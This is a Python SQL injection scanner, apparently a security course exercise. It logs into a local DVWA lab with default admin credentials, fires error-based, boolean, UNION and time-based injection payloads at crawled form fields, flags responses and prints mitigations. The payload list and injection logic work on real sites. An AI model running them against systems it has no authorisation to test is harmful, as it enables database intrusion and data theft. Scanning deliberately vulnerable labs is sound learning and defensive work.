import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin
import json
import time
import re

session = requests.Session()

base_url = "http://localhost:8080"
login_url = base_url + "/login.php"

# ── Payloads ──────────────────────────────────────────────────────────────────

PAYLOADS = [
    {"payload": "'",                                          "type": "Error-Based"},
    {"payload": "1' OR '1'='1' -- ",                         "type": "Boolean-Based"},
    {"payload": "1' OR '1'='2' -- ",                         "type": "Boolean-Based"},
    {"payload": "1' AND 1=1 -- ",                            "type": "Boolean-Based"},
    {"payload": "1' AND 1=2 -- ",                            "type": "Boolean-Based"},
    {"payload": "1' UNION SELECT null,null -- ",             "type": "UNION-Based"},
    {"payload": "1' UNION SELECT user(),database() -- ",     "type": "UNION-Based"},
    {"payload": "1' UNION SELECT table_name,NULL FROM information_schema.tables -- ", "type": "UNION-Based"},
    {"payload": "1' AND SLEEP(3) -- ",                       "type": "Time-Based"},
    {"payload": "1' AND EXTRACTVALUE(1,CONCAT(0x7e,database())) -- ", "type": "Error-Based"},
]

ERROR_SIGNATURES = [
    r"you have an error in your sql syntax",
    r"warning: mysql",
    r"unclosed quotation mark",
    r"quoted string not properly terminated",
    r"mysql_fetch",
    r"supplied argument is not a valid mysql",
    r"ora-\d{5}",
    r"sqlite_error",
]

findings = []  # stores all vulnerable results


# ── Login (same as your crawler) ──────────────────────────────────────────────

def login():
    print("Logging into DVWA...")

    res = session.get(login_url)
    soup = BeautifulSoup(res.text, "html.parser")

    token = soup.find("input", {"name": "user_token"})
    if token:
        token = token.get("value")

    data = {
        "username": "admin",
        "password": "password",
        "Login": "Login",
        "user_token": token
    }

    session.post(login_url, data=data)
    print("Login complete.")


# ── Load targets.json from crawler ────────────────────────────────────────────

def load_sqli_targets():
    with open("../crawler/targets.json", "r") as f:
        all_targets = json.load(f)

    # filter only forms that have a text input (potential injection points)
    # and skip login/setup/logout pages
    skip_pages = ["login.php", "setup.php", "logout.php", "security.php"]

    sqli_targets = []
    for target in all_targets:
        if any(skip in target["page"] for skip in skip_pages):
            continue
        for inp in target["inputs"]:
            if inp["type"] == "text":
                sqli_targets.append(target)
                break  # one text input is enough to include this form

    print(f"Found {len(sqli_targets)} forms with text inputs to test.\n")
    return sqli_targets


# ── Detection helpers ─────────────────────────────────────────────────────────

def has_sql_error(response_text):
    text_lower = response_text.lower()
    for pattern in ERROR_SIGNATURES:
        if re.search(pattern, text_lower):
            return True, pattern
    return False, None


def assign_severity(vuln_type):
    severity_map = {
        "Error-Based":   "High",
        "UNION-Based":   "Critical",
        "Boolean-Based": "Medium",
        "Time-Based":    "High",
    }
    return severity_map.get(vuln_type, "Medium")


# ── Test a single form with all payloads ──────────────────────────────────────

def test_form(target):
    url    = target["action"]
    method = target["method"]
    inputs = target["inputs"]

    # get baseline response with normal input
    baseline_params = {}
    for inp in inputs:
        if inp["type"] == "text":
            baseline_params[inp["name"]] = "1"
        elif inp["type"] == "submit" and inp["name"]:
            baseline_params[inp["name"]] = "Submit"

    if method == "get":
        baseline_resp = session.get(url, params=baseline_params)
    else:
        baseline_resp = session.post(url, data=baseline_params)
    #saving the size of normal page
    baseline_len = len(baseline_resp.text)

    for entry in PAYLOADS:
        payload   = entry["payload"]
        vuln_type = entry["type"]

        # build params — inject payload into every text field
        params = {}
        for inp in inputs:
            if inp["type"] == "text":
                params[inp["name"]] = payload
            elif inp["type"] == "submit" and inp["name"]:
                params[inp["name"]] = "Submit"

        vulnerable = False
        evidence   = ""

        if vuln_type == "Time-Based":
            start = time.time()
            try:
                if method == "get":
                    session.get(url, params=params, timeout=10)
                else:
                    session.post(url, data=params, timeout=10)
            except requests.exceptions.Timeout:
                vulnerable = True
                evidence   = "Request timed out — server delayed response"
            else:
                elapsed = round(time.time() - start, 2)
                if elapsed >= 2.5:
                    vulnerable = True
                    evidence   = f"Response delayed {elapsed}s — time-based blind SQLi"

        else:
            if method == "get":
                resp = session.get(url, params=params)
            else:
                resp = session.post(url, data=params)

            is_error, matched = has_sql_error(resp.text)

            if is_error:
                vulnerable = True
                evidence   = f"SQL error signature matched: '{matched}'"

            elif vuln_type == "UNION-Based" and len(resp.text) > baseline_len + 50:
                vulnerable = True
                evidence   = f"Response grew by {len(resp.text) - baseline_len} bytes — possible data leak"

            elif vuln_type == "Boolean-Based":
                diff = abs(len(resp.text) - baseline_len)
                if diff > 30:
                    vulnerable = True
                    evidence   = f"Response length changed by {diff} bytes vs baseline"

        # print result
        status = "[VULNERABLE]" if vulnerable else "[safe]      "
        print(f"  {status}  {vuln_type:<14}  payload: {payload[:50]}")
        if vulnerable:
            print(f"             evidence: {evidence}")

        if vulnerable:
            findings.append({
                "page":     target["page"],
                "endpoint": url,
                "method":   method,
                "payload":  payload,
                "type":     vuln_type,
                "evidence": evidence,
                "severity": assign_severity(vuln_type),
            })

        time.sleep(0.2)


# ── Run tests on all sqli targets ─────────────────────────────────────────────

def run_sqli_tests(targets):
    for target in targets:
        print(f"\nTesting: {target['page']}")
        print("-" * 60)
        test_form(target)


# ── Summary ───────────────────────────────────────────────────────────────────

def print_summary():
    print("\n" + "=" * 60)
    print("SCAN SUMMARY")
    print("=" * 60)

    if not findings:
        print("No SQL injection vulnerabilities found.")
        return

    print(f"Total vulnerable payloads : {len(findings)}")

    severity_count = {}
    type_count = {}
    for f in findings:
        severity_count[f["severity"]] = severity_count.get(f["severity"], 0) + 1
        type_count[f["type"]] = type_count.get(f["type"], 0) + 1

    print("\nSeverity Breakdown:")
    for sev, count in severity_count.items():
        print(f"  {sev}: {count}")

    print("\nVulnerability Types:")
    for typ, count in type_count.items():
        print(f"  {typ}: {count} payload(s)")

    print("\nMitigations:")
    print("  1. Use parameterized queries / prepared statements")
    print("  2. Validate and whitelist all user inputs")
    print("  3. Never expose raw SQL errors to users")
    print("  4. Use least-privilege database accounts")
    print("  5. Consider an ORM (SQLAlchemy, Django ORM)")


# ── Save findings to JSON (for Week 7 report) ─────────────────────────────────

def save_findings():
    with open("sqli_findings.json", "w") as f:
        json.dump(findings, f, indent=4)
    print("\nFindings saved to sqli_findings.json")


# ── Main ──────────────────────────────────────────────────────────────────────

login()
targets = load_sqli_targets()
run_sqli_tests(targets)
print_summary()
save_findings()
